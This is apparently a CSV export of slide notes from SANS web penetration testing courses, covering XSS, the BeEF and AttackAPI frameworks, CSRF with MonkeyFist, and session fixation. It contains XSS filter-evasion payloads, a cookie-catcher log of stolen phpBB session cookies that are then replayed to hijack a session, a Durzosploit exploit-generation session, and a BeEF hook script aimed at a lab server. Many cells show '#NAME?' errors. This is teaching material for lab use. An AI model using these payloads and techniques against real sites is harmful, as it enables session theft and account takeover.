Recieved=/cookiecatcher.php?PHPSESSID=d8a212b5dfcfeb029251d7d7d99b4403;%20phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bs%3A0%3A%22%22%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%224%22%3B%7D;%20phpbb2mysql_sid=5953980c806f745ac0199cee607c8e54;%20phpbb2mysql_t=a%3A1%3A%7Bi%3A23%3Bi%3A1299535467%3B%7D

- I closed my browser and reconnected to PHPBB as anonymous and intercepted a request in Burp and added the cookies from the cookie dump and ""restored"" my previous session...",5. Exploitation,5.3 XSS,B5P90,,,,,,sec542/5.3/index.htm#s18,,,,
S542-5.3.11,SEC542,XSS Filtering Evasion Examples (2),,,,,,"- .NET or CA Site Minder has blacklist filtering. 
- Whitelisting is the only way to go.
- HTML Entities
  <IMG SRC=javascript:alert(&quot;XSS&quot;)>
- Hex Encoding
  <IMG SRC=&#x6A&#x61&#x76...>",5. Exploitation,5.3 XSS,B5P83,,,,,,sec542/5.3/index.htm#s11,,,,
S542-5.3.20,SEC542,XSS Advanced Script Injection,,,,,,"- We'll explore Durzosploit exploitation
- These attacks are limited to our imagination
- Using the feature set of the browser (not app vulnerability) ",5. Exploitation,5.3 XSS,B5P92,,,,,,sec542/5.3/index.htm#s20,,,,
S542-5.3.21,SEC542,XSS Port Scanner,,,,,,#NAME?,5. Exploitation,5.3 XSS,B5P93,,,,,,sec542/5.3/index.htm#s21,,,,
S542-5.3.22,SEC542,Internal Addresses,,,,,,"- With JavaScript, internal addresses (for scanning) are not possible to obtain
- Solution: MyAddress.class from Lars Kinderman http://reglos.de/myaddress
- See /home/samurai/classes/MyAddress.class (perhaps specific to SEC-542 VM)",5. Exploitation,5.3 XSS,B5P94,,,,,,sec542/5.3/index.htm#s22,,,,
S542-5.3.23,SEC542,MyAddress.class,,,,,,#NAME?,5. Exploitation,5.3 XSS,B5P95,,,,,,sec542/5.3/index.htm#s23,,,,
S542-5.3.12,SEC542,,,,,,,,5. Exploitation,5.3 XSS,,,,,,,sec542/5.3/index.htm#s12,,,,
S542-5.3.19,SEC542,,,,,,,,5. Exploitation,5.3 XSS,,,,,,,sec542/5.3/index.htm#s19,,,,
S542-5.3.26,SEC542,"Sources of Defaults (image files, fingerprints)",,,,,,#NAME?,5. Exploitation,5.3 XSS,B5P98,,,,,,sec542/5.3/index.htm#s26,,,,
S542-5.3.27,SEC542,Browse History,,,,,,"- JavaScript checks if the link is displayed with link or vlink colors
- See http://www.gnucitizen.org/projects/javascript-visited-link-scanner/",5. Exploitation,5.3 XSS,B5P99,,,,,,sec542/5.3/index.htm#s27,,,,
S542-5.3.28,SEC542,History Scanning Uses,,,,,,"- Targets for DNS cache poisoning or targeted phishing attacks
- Find admin. users (good for future exploitation), eg: HP's ILO 
- Map intranet sites
- Discover network devices",5. Exploitation,5.3 XSS,B5P100,,,,,,sec542/5.3/index.htm#s28,,,,
S542-5.3.29,SEC542,Durzosploit,,,,,,#NAME?,5. Exploitation,5.3 XSS,B5P101,,,,,,sec542/5.3/index.htm#s29,,,,
S542-5.3.24,SEC542,XSS Server Fingerprinting,,,,,,"- After finding www servers, find-out what they're running
- Most servers have default graphics/files: apache_pb.gif, hp_invent_logo.gif (ILO)...
- Jikto: nikto port to JavaScript",5. Exploitation,5.3 XSS,B5P96,,,,,,sec542/5.3/index.htm#s24,,,,
S542-5.3.25,SEC542,Fingerprinting Code,,,,,,"- Use IMG tag's onerror and onload event (graphic exists)
  <img src=http://...jpg onerror=""fingerpt('error')"" onload=""fingerpt('match')"">",5. Exploitation,5.3 XSS,B5P97,,,,,,sec542/5.3/index.htm#s25,,,,
S542-5.1.10,SEC542,Authentication Bypass,,,,,,-,5. Exploitation,5.1 Auth. Bypass,B5P10,,,,,,sec542/5.1/index.htm#s10,,,,
S542-5.3.30,SEC542,,,,,,,,5. Exploitation,5.3 XSS,,,,,,,sec542/5.3/index.htm#s30,,,,
S542-5.3.31,SEC542,,,,,,,,5. Exploitation,5.3 XSS,,,,,,,sec542/5.3/index.htm#s31,,,,
S542-5.3.32,SEC542,Durzosploit Exercise,,,,,,"- Launch it: cd /usr/bin/samurai/durzosploit; ./durzosploit
?  (dz) > help
  more      - print more informations about an exploit  
  session   - manages your current session (show, add, select, delete exploits) 
  generate  - generate the project exploit code
  search    - search for exploits in the framework
  unload    - unloads an loaded exploit
  load      - load an exploit to use 
  obfuscate - obfuscate a generated project
- Create new sesesion by typing: session new sec542",5. Exploitation,5.3 XSS,B5P104,,,,,,sec542/5.3/index.htm#s32,,,,
S542-5.3.33,SEC542,Durzosploit Exercise: Exploit Creation,,,,,,"?(dz) > session new sec542
new project sec542 added to session
(dz) > search exploits
drupal/xss_stored_site_title      - Drupal 6.x - exploit a stored XSS in the admin panel
drupal/logout                     - Drupal 6.x - makes target logout
drupal/edit_user_profile          - Drupal 6.x - edit the profile of the user
facebook.com/what_is_on_your_mind - Write your message in your target's mind
twitter.com/update_settings       - Updates your target's settings
twitter.com/update_status         - Updates a target's status
(dz) > load twitter.com/update_status
Please fill out the parameters:
Status: Sec542 owns you!
(dz) > generate
Your completed exploit can be found there output/sec542.js
(dz) > ",5. Exploitation,5.3 XSS,B5P105,,,,,,sec542/5.3/index.htm#s33,,,,
S542-5.3.34,SEC542,Durzosploit Exercise: Obfuscation,,,,,,"?(dz) > search obfuscators
packr  - DeanEdward's packer
minify - simple clean of the javascript code
(dz) > obfuscate packr
Successfuly packed project to output/sec542.ob.js with Packr
?(dz) > quit",5. Exploitation,5.3 XSS,B5P106,,,,,,sec542/5.3/index.htm#s34,,,,
S542-5.3.35,SEC542,Durzosploit Exercise: Examine Payloads,,,,,,- cat output/*,5. Exploitation,5.3 XSS,B5P107,,,,,,sec542/5.3/index.htm#s35,,,,
S542-5.4.01,SEC542,XSS Frameworks: Section Objectives,,,,,,"XSS attack frameworks as well as AttackAPI functionality, BeEF functionality, Interprotocol exploitation, and Limiting XSS attacks during a pen-test.",5. Exploitation,5.4 XSS Frameworks,B5P108,,,,,,sec542/5.4/index.htm#s1,,,,
S542-5.4.02,SEC542,Exploit Frameworks,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P109,,,,,,sec542/5.4/index.htm#s2,,,,
S542-5.4.03,SEC542,Frameworks Covered,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P110,,,,,,sec542/5.4/index.htm#s3,,,,
S542-5.4.04,SEC542,Zombies,,,,,,"- Similar to Bots (lower level) spread by worms 
- They run within in the browser context
- Victim's zombie browser used to perform attacks",5. Exploitation,5.4 XSS Frameworks,B5P111,,,,,,sec542/5.4/index.htm#s4,,,,
S542-5.4.05,SEC542,,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s5,,,,
S542-5.4.06,SEC542,AttackAPI,,,,,,"- http://www.gnucitizen.org/projects/attackapi
- Uses PHP & JavaScript
- Pre-built attack scripts as building-blocks: Retrieve Client/Server Info, AuthenticationForce, ExtensionScanner, HistoryDumper, NetworkSweeper, PortScanner, UsernameScanner, URLScanner, URLFetcher...",5. Exploitation,5.4 XSS Frameworks,B5P113,,,,,,sec542/5.4/index.htm#s6,,,,
S542-5.4.07,SEC542,AttackAPI ExtensionScanner,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P114,,,,,,sec542/5.4/index.htm#s7,,,,
S542-5.4.09,SEC542,AttackAPI AuthenticationForce,,,,,,"- Authentication bruteforcing via JavaScript (basic or digest)
- Uses http://user:password@domain form",5. Exploitation,5.4 XSS Frameworks,B5P116,,,,,,sec542/5.4/index.htm#s9,,,,
S542-5.4.08,SEC542,AttackAPI HistoryDumper,,,,,,"- Checks visited links via a bruteforce attack (doesn't scan the browser history)
- Uses an IFRAME to load a list of links",5. Exploitation,5.4 XSS Frameworks,B5P115,,,,,,sec542/5.4/index.htm#s8,,,,
S542-5.4.10,SEC542,AttackAPI: NetworkSweeper,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P117,,,,,,sec542/5.4/index.htm#s10,,,,
S542-5.4.11,SEC542,AttackAPI: PortScanner,,,,,,"- Port scans a target host (except port  53 which isn't available via JavaScript directly)
- Builds upon the NetworkSweeper",5. Exploitation,5.4 XSS Frameworks,B5P118,,,,,,sec542/5.4/index.htm#s11,,,,
S542-5.4.12,SEC542,AttackAPI: URLScanner/Fetcher,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P119,,,,,,sec542/5.4/index.htm#s12,,,,
S542-5.4.13,SEC542,AttackAPI: channel.php,,,,,,"- Zombie control, bidirectional channel
- Extendable. Disabled by default (remove .htaccess to enable)
- Very basic. It's better to use other frameworks (such as BeEF)",5. Exploitation,5.4 XSS Frameworks,B5P120,,,,,,sec542/5.4/index.htm#s13,,,,
S542-5.4.14,SEC542,,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s14,,,,
S542-5.4.15,SEC542,BeEF,,,,,,"- Framework that focuses on payload delivery
- http://www.bindshell.net
- Powerful frameworks due to the inter-protocol features
- Some commands will return results on the zombie screens...",5. Exploitation,5.4 XSS Frameworks,B5P122,,,,,,sec542/5.4/index.htm#s15,,,,
S542-5.4.17,SEC542,BeEF  Functionality,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P124,,,,,,sec542/5.4/index.htm#s17,,,,
S542-5.4.18,SEC542,BeEF Module: Clipboard,,,,,,"- Sends the victim's clipboard contents to the BeEF server
- Abuses pre-IE7 features (IE7 will prompt user)",5. Exploitation,5.4 XSS Frameworks,B5P125,,,,,,sec542/5.4/index.htm#s18,,,,
S542-5.4.16,SEC542,BeEF Zombie Control,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P123,,,,,,sec542/5.4/index.htm#s16,,,,
S542-5.4.19,SEC542,BeEF Module: History Browsing,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P126,,,,,,sec542/5.4/index.htm#s19,,,,
S542-5.4.20,SEC542,BeEF Module: Request Initiation,,,,,,- We don't see the response back (but not necessary for CSRF),5. Exploitation,5.4 XSS Frameworks,B5P127,,,,,,sec542/5.4/index.htm#s20,,,,
S542-5.4.21,SEC542,BeEF Module: Port Scanning,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P128,,,,,,sec542/5.4/index.htm#s21,,,,
S542-5.4.22,SEC542,BeEF Module: JavaScript Injection,,,,,,"- Allows for running further code (as with AttackAPI) for stuff that BeEF doesn't have
- Runs within browser context",5. Exploitation,5.4 XSS Frameworks,B5P129,,,,,,sec542/5.4/index.htm#s22,,,,
S542-5.4.24,SEC542,BeEF Module: Inter-Protocol Exploitation,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P131,,,,,,sec542/5.4/index.htm#s24,,,,
S542-5.4.25,SEC542,BeEF Module: Inter-Protocol Exploitation,,,,,,"- Hooked browsers can send HTTP requests to [forgiving] protocols/services on other servers  (HTTP headers are simply rejected by targetted services)
- The payload sent to the server could inject a BindShell as an exploit 
- Shell is made available through the BeEF controller app on the pentester's server",5. Exploitation,5.4 XSS Frameworks,B5P132,,,,,,sec542/5.4/index.htm#s25,,,,
S542-5.4.23,SEC542,BeEF Module: Browser Exploits,,,,,,"- Push malicious payloads for vulnerable/unpatched browsers
- By default (as a demo), the exploit will run calc.exe
- XSS --> BeEF --> Client exploitation (i.e. to spread/execute malicious code)",5. Exploitation,5.4 XSS Frameworks,B5P130,,,,,,sec542/5.4/index.htm#s23,,,,
S542-5.4.26,SEC542,BeEF Module: Inter-Protocol Exploitation (Illustrated),,,,,,"1. Attacker --> Web App (BeEF XSS stub injected)
2. User       --> Web App (BeEF XSS hooks the browser)
3. Browser --> BeEF Controller (Browser reports to controller and awaits commands)
4. Attacker  --> BeEF Controller (Attacker access BeEF to view zombies)",5. Exploitation,5.4 XSS Frameworks,B5P133,,,,,,sec542/5.4/index.htm#s26,,,,
S542-5.4.27,SEC542,BeEF Exploit Module Interface,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P134,,,,,,sec542/5.4/index.htm#s27,,,,
S542-5.4.28,SEC542,BeEF Module:,,,,,,"5. Attacker --> BeEF --> Browser (Send command to deliver exploit to internal server)
6. Browser --> Internal Server (Exploit server with Inter-Prot. Exploitation w/ BindShell)
7. Attacker --> BeEF --> Browser --> Internal Server (interaction with BindShell)",5. Exploitation,5.4 XSS Frameworks,B5P135,,,,,,sec542/5.4/index.htm#s28,,,,
S542-5.4.32,SEC542,BeEF Exercise: Config BeEF,,,,,,"- ?http://192.168.1.40/beef/
- Password for BeEF: BeEFConfigPass",5. Exploitation,5.4 XSS Frameworks,B5P139,,,,,,sec542/5.4/index.htm#s32,,,,
S542-5.4.33,SEC542,BeEF Exercise: Setup Attack,,,,,,"- Menu: Standard Modules --> Alert Dialog, change Text
- Click Set Autorun",5. Exploitation,5.4 XSS Frameworks,B5P140,,,,,,sec542/5.4/index.htm#s33,,,,
S542-5.4.34,SEC542,BeEF Exercise: Hook Victim,,,,,,"- Menu: View --> Spawn Zombie Example
- Another browser window shows-up with a test page and the Autorun pop-up
- The text in the BeEF Test Page has:
  ?The following code needs to be included in the zombie:
<script language='Javascript' src=""http://192.168.1.40/beef/hook/beefmagic.js.php'></script> 
- The test page is hooked to BeEF and it shows-up in the main screen under Zombies
- Can redo this by Menu: View --> Spawn Zombie Example",5. Exploitation,5.4 XSS Frameworks,B5P141,,,,,,sec542/5.4/index.htm#s34,,,,
S542-5.4.35,SEC542,BeEF Exercise: Using Zombie,,,,,,"- Menu: Network Modules --> Detect Visited URLs, Distrib. Port Scanner...
- Menu: Standard Modules --> Detect Flash, Rewrite Status Bar, Detect Plugins, Deface,  Prompt Dialog (Enter Password...)
- Menu: Browser Modules: MSF Browser Autopwn, MSF Java Applet Payload...",5. Exploitation,5.4 XSS Frameworks,B5P142,,,,,,sec542/5.4/index.htm#s35,,,,
S542-5.4.36,SEC542,,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s36,,,,
S542-5.4.37,SEC542,,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s37,,,,
S542-5.4.38,SEC542,XSS Attacks: Limiting Targets,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P145,,,,,,sec542/5.4/index.htm#s38,,,,
S542-5.4.39,SEC542,XSS Scope Limits: Client-side code with Java Applet,,,,,,"- Use MyAddress.class (only code that runs in out-of-scope clients, nothing malicious)
- This is checking the private IP
- (see illustration)",5. Exploitation,5.4 XSS Frameworks,B5P146,,,,,,sec542/5.4/index.htm#s39,,,,
S542-5.4.30,SEC542,,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s30,,,,
S542-5.4.29,SEC542,BeEF UI (BindShell),,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P136,,,,,,sec542/5.4/index.htm#s29,,,,
S542-5.4.31,SEC542,,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s31,,,,
S542-5.4.40,SEC542,XSS Scope Limits: Client-Side Code interacting with Pen Tester's Server,,,,,,"- XSS code in victim browser sends a request to the PenTester's server to check if the browser is in scope 
- This is checking the public IP
- (see illustration)",5. Exploitation,5.4 XSS Frameworks,B5P147,,,,,,sec542/5.4/index.htm#s40,,,,
S542-5.4.41,SEC542,XSS Scope Limits:  Server-side Code on Target Server,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P148,,,,,,sec542/5.4/index.htm#s41,,,,
S542-5.4.43,SEC542,XSS Scope Limits: PenTester Infra Config,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P150,,,,,,sec542/5.4/index.htm#s43,,,,
S542-5.4.46,SEC542,Course Roadmap,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s46,,,,
S542-5.4.47,SEC542,Session Fixation,,,,,,"- Allows an attacker to control a user's session ID
1. Web Site --> Attacker: Send a valid (non-authenticated) session ID
2. Attacker --> Victim: Get victim to use the received session ID 
3. Victim --> Web Site: Use the received session ID (in URL) and authenticate 
4. Attacker --> Web Site: Use the same session by continuing the use of the Session ID
- To discover it, you have to exploit it (send link  to another person and see if they're you)",5. Exploitation,5.4 XSS Frameworks,B5P154,,,,,,sec542/5.4/index.htm#s47,,,,
S542-5.4.48,SEC542,Course Roadmap,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s48,,,,
S542-5.4.44,SEC542,Course Roadmap,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s44,,,,
S542-5.4.42,SEC542,XSS Scope Limits: Server-side Code on PenTest Server,,,,,,"- Browser goes to PenTester's Server to let it check if the browser's in scope
- PenTester's server also sends XSS attack script
- (see illustration)",5. Exploitation,5.4 XSS Frameworks,B5P149,,,,,,sec542/5.4/index.htm#s42,,,,
S542-5.4.45,SEC542,Session Flaws,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P152,,,,,,sec542/5.4/index.htm#s45,,,,
S542-5.4.50,SEC542,MonkeyFist,,,,,,"- Python app from http://hexsec.com/labs
- Includes a simple HTTP server. Uses an XML file to configure the attacks
- Multiple selected CSRF attacks lauched based on referer header. Multiple options exist.",5. Exploitation,5.4 XSS Frameworks,B5P157,,,,,,sec542/5.4/index.htm#s50,,,,
S542-5.4.53,SEC542,Course Roadmap,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s53,,,,
S542-5.4.54,SEC542,MonkeyFist Exercise,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s54,,,,
S542-5.4.55,SEC542,MonkeyFist Exercise: Configure MF,,,,,,"cd /usr/bin/samurai/MonkeyFist_v04
vi payloads.xml
./MonkeyFist.py -p 8080 -s",5. Exploitation,5.4 XSS Frameworks,B5P162,,,,,,sec542/5.4/index.htm#s55,,,,
S542-5.4.56,SEC542,MonkeyFist Exercise: Create Attack Post,,,,,,"- Go to PHPBB, login as sec542/SANSUSER
- Select Test Forum 1 and client New Topic. 
- Add subject and a link to http://192.168.1.40:8080
- Submit the post",5. Exploitation,5.4 XSS Frameworks,B5P163,,,,,,sec542/5.4/index.htm#s56,,,,
S542-5.4.57,SEC542,MonkeyFist Exercise: Attack,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P164,,,,,,sec542/5.4/index.htm#s57,,,,
S542-5.4.49,SEC542,CSRF Attack,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P156,,,,,,sec542/5.4/index.htm#s49,,,,
S542-5.4.59,SEC542,Course Roadmap,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s59,,,,
S542-5.4.60,SEC542,Putting it all together,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P167,,,,,,sec542/5.4/index.htm#s60,,,,
S542-5.4.61,SEC542,A Process,,,,,,"- These 4 steps make up a cyclical process
- Vulnerabilities found become pivot points",5. Exploitation,5.4 XSS Frameworks,B5P168,,,,,,sec542/5.4/index.htm#s61,,,,
S542-5.4.52,SEC542,MonkeyFist Attack: PAGE,,,,,,"- PAGE option will attack the CSRF vulnerability then redirect to another page using a META Refresh
- See sample XML in slide <METHOD>PAGE...<ATTACKTYPE>GET...<TARGET>...",5. Exploitation,5.4 XSS Frameworks,B5P159,,,,,,sec542/5.4/index.htm#s52,,,,
S542-5.4.51,SEC542,MonkeyFist Attack: GET/POST,,,,,,"- XML file with multiple referer site and a respective CSRF-vulnerable targets
- Can specify the sending of GET or POST requests and specific HTTP header values
- Result may not be acceptable to victim (use PAGE method instead...)
- See sample XML in slide <METHOD>GET...<TARGET>http://...",5. Exploitation,5.4 XSS Frameworks,B5P158,,,,,,sec542/5.4/index.htm#s51,,,,
S542-5.4.58,SEC542,MonkeyFist Exercise,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s58,,,,
S542-5.4.62,SEC542,Pivot Points,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P169,,,,,,sec542/5.4/index.htm#s62,,,,
S542-5.4.63,SEC542,Course Roadmap,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s63,,,,
S542-5.4.64,SEC542,Attack Scenario,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P171,,,,,,sec542/5.4/index.htm#s64,,,,
S542-5.4.65,SEC542,Scenario Setup,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P172,,,,,,sec542/5.4/index.htm#s65,,,,
S542-5.4.67,SEC542,Recon (scenario),,,,,,"- Whois, DNS...
- Google searches:
  -> Too much information due to target type
  -> Infrastructure was disclosed (web servers...)
  -> Information regarding resellers was also found",5. Exploitation,5.4 XSS Frameworks,B5P174,,,,,,sec542/5.4/index.htm#s67,,,,
S542-5.4.70,SEC542,Exploitation (scenario),,,,,,"- Filled a whole bunch of XSS sign-ups and injected code to load XSS-Proxy
- XSS-Proxy let her control the admin browser:
  - Wait for the admin to login and review sign-up forms
  - The browser then connects to XSS-Proxy control page on Penelope's server
  - Penelope now has control of the browser to actually approve her own account
- Penelope  then has a pivot point within the app. Her account has had privileges escalated. Time to start the process again with her credentials...",5. Exploitation,5.4 XSS Frameworks,B5P177,,,,,,sec542/5.4/index.htm#s70,,,,
S542-5.4.71,SEC542,Recon #2 (scenario),,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P178,,,,,,sec542/5.4/index.htm#s71,,,,
S542-5.4.66,SEC542,Application Setup,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P173,,,,,,sec542/5.4/index.htm#s66,,,,
S542-5.4.72,SEC542,Mapping #2 (scenario),,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P179,,,,,,sec542/5.4/index.htm#s72,,,,
S542-5.4.73,SEC542,Discover #2 (scenario),,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P180,,,,,,sec542/5.4/index.htm#s73,,,,
S542-5.4.74,SEC542,Exploitation,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P181,,,,,,sec542/5.4/index.htm#s74,,,,
S542-5.4.75,SEC542,,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s75,,,,
S542-5.4.69,SEC542,Discovery (scenario),,,,,,"- Most of the site had brochures and manuals
- Reseller sign-up page appeared as a key target...
- Found client-side filtering for XSS. 
- Easily bypassed to launch XSS attack
- Was able to bypass XSS filters and submit an image tag that caused the admin (that reviewed the sign-up form) to load a file from Penelope's server. She now knows the app is vulnerable.",5. Exploitation,5.4 XSS Frameworks,B5P176,,,,,,sec542/5.4/index.htm#s69,,,,
S542-5.4.68,SEC542,Mapping (scenario),,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P175,,,,,,sec542/5.4/index.htm#s68,,,,
S542-5.4.79,SEC542,Web App Lab,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P186,,,,,,sec542/5.4/index.htm#s79,,,,
S542-5.4.80,SEC542,Explore,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P187,,,,,,sec542/5.4/index.htm#s80,,,,
S542-5.4.81,SEC542,Explain,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P188,,,,,,sec542/5.4/index.htm#s81,,,,
S542-5.4.77,SEC542,Practices,,,,,,#NAME?,5. Exploitation,5.4 XSS Frameworks,B5P184,,,,,,sec542/5.4/index.htm#s77,,,,
S542-5.4.82,SEC542,,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s82,,,,
S542-5.4.83,SEC542,,,,,,,,5. Exploitation,5.4 XSS Frameworks,,,,,,,sec542/5.4/index.htm#s83,,,,
S542-6.1.01,SEC542,Capture The Flag: Section Objectives,,,,,,"Capture The Flag: Complete an entire penetration test using techniques, tools, and methodology learned throughout the Security 542 course, be able to use these ideas and methods against a realistic intranet application, and provide a verbal report of the findings and methodology followed to complete the test.",6. CTF,6.1 CTF,B6P191,,,,,,sec542/6.1/index.htm#s1,,,,
S542-5.4.76,SEC542,Next Steps,,,,,,"After the class: practice, explore, explain",5. Exploitation,5.4 XSS Frameworks,B5P183,,,,,,sec542/5.4/index.htm#s76,,,,
S542-5.4.78,SEC542,Pre-Built Apps,,,,,,"- WebGoat (expand it, use it internally in a test lab)
- Damm Vulnerable Linux
- Mutillidae (irongeek.com, OWASP Top 10)
- Moth VM from the W3AF guy",5. Exploitation,5.4 XSS Frameworks,B5P185,,,,,,sec542/5.4/index.htm#s78,,,,
S542-6.1.05,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P195,,,,,,sec542/6.1/index.htm#s5,,,,
S542-6.1.06,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P196,,,,,,sec542/6.1/index.htm#s6,,,,
S542-6.1.07,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P197,,,,,,sec542/6.1/index.htm#s7,,,,
S542-6.1.08,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P198,,,,,,sec542/6.1/index.htm#s8,,,,
S542-6.1.09,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P199,,,,,,sec542/6.1/index.htm#s9,,,,
S542-6.1.10,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P200,,,,,,sec542/6.1/index.htm#s10,,,,
S542-6.1.11,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P201,,,,,,sec542/6.1/index.htm#s11,,,,
S542-6.1.12,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P202,,,,,,sec542/6.1/index.htm#s12,,,,
S542-6.1.13,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P203,,,,,,sec542/6.1/index.htm#s13,,,,
S542-6.1.14,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P204,,,,,,sec542/6.1/index.htm#s14,,,,
S542-6.1.15,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P205,,,,,,sec542/6.1/index.htm#s15,,,,
S542-6.1.16,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P206,,,,,,sec542/6.1/index.htm#s16,,,,
S642-1.2.1.001,SEC642,Heap-based buffer overflow (CVE-2015-0235),,,,,,"Heap-based buffer overflow in the __nss_hostname_digits_dots function in glibc 2.2, and other 2.x versions before 2.18, allows context-dependent attackers to execute arbitrary code via vectors related to the (1) gethostbyname or (2) gethostbyname2 fun...",,1.2.1: Web Penetration Testing,1,,,,,,sec642/43260/index.htm,,,,
S642-1.2.1.002,SEC642,2. Course Roadmap,,,,,,,,1.2.1: Web Penetration Testing,2,,,,,,sec642/43260/index.htm#2,,,,
S642-1.2.1.003,SEC642,3. Web Penetration Testing,,,,,,,,1.2.1: Web Penetration Testing,3,,,,,,sec642/43260/index.htm#3,,,,
S642-1.2.1.004,SEC642,4. Understanding Attacks,,,,,,,,1.2.1: Web Penetration Testing,4,,,,,,sec642/43260/index.htm#4,,,,
S642-1.2.1.005,SEC642,5. Testing Methodology,,,,,,,,1.2.1: Web Penetration Testing,5,,,,,,sec642/43260/index.htm#5,,,,
S642-1.2.1.006,SEC642,6. Complete Each Step,,,,,,,,1.2.1: Web Penetration Testing,6,,,,,,sec642/43260/index.htm#6,,,,
S542-6.1.02,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P192,,,,,,sec542/6.1/index.htm#s2,,,,
S542-6.1.03,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P193,,,,,,sec542/6.1/index.htm#s3,,,,
S542-6.1.04,SEC542,,,,,,,,6. CTF,6.1 CTF,B6P194,,,,,,sec542/6.1/index.htm#s4,,,,
S642-1.2.1.007,SEC642,7. Skipping Around,,,,,,,,1.2.1: Web Penetration Testing,7,,,,,,sec642/43260/index.htm#7,,,,
S642-1.2.1.008,SEC642,8. Cyclical Process,,,,,,,,1.2.1: Web Penetration Testing,8,,,,,,sec642/43260/index.htm#8,,,,
S642-1.2.1.009,SEC642,9. Course Roadmap,,,,,,,,1.2.1: Web Penetration Testing,9,,,,,,sec642/43260/index.htm#9,,,,
S642-1.2.1.010,SEC642,10. Understanding Context,,,,,,,,1.2.1: Web Penetration Testing,10,,,,,,sec642/43260/index.htm#10,,,,
S642-1.2.1.011,SEC642,11. Application Context,,,,,,,,1.2.1: Web Penetration Testing,11,,,,,,sec642/43260/index.htm#11,,,,
S642-1.2.2.015,SEC642,2. Burp Suite,,,,,,,,1.2.2: Burp Suite In-Depth,15,,,,,,sec642/43265/index.htm#2,,,,
S642-1.2.2.016,SEC642,3. Chaining Proxies,,,,,,,,1.2.2: Burp Suite In-Depth,16,,,,,,sec642/43265/index.htm#3,,,,
S642-1.2.2.017,SEC642,4. Burp Suite Components,,,,,,,,1.2.2: Burp Suite In-Depth,17,,,,,,sec642/43265/index.htm#4,,,,
S642-1.2.2.018,SEC642,5. Using Burp Suite,,,,,,,,1.2.2: Burp Suite In-Depth,18,,,,,,sec642/43265/index.htm#5,,,,
S642-1.2.2.019,SEC642,6. Course Roadmap,,,,,,,,1.2.2: Burp Suite In-Depth,19,,,,,,sec642/43265/index.htm#6,,,,
S642-1.2.2.020,SEC642,7. Burp Target,,,,,,,,1.2.2: Burp Suite In-Depth,20,,,,,,sec642/43265/index.htm#7,,,,
S642-1.2.2.021,SEC642,8. Filtering,,,,,,,,1.2.2: Burp Suite In-Depth,21,,,,,,sec642/43265/index.htm#8,,,,
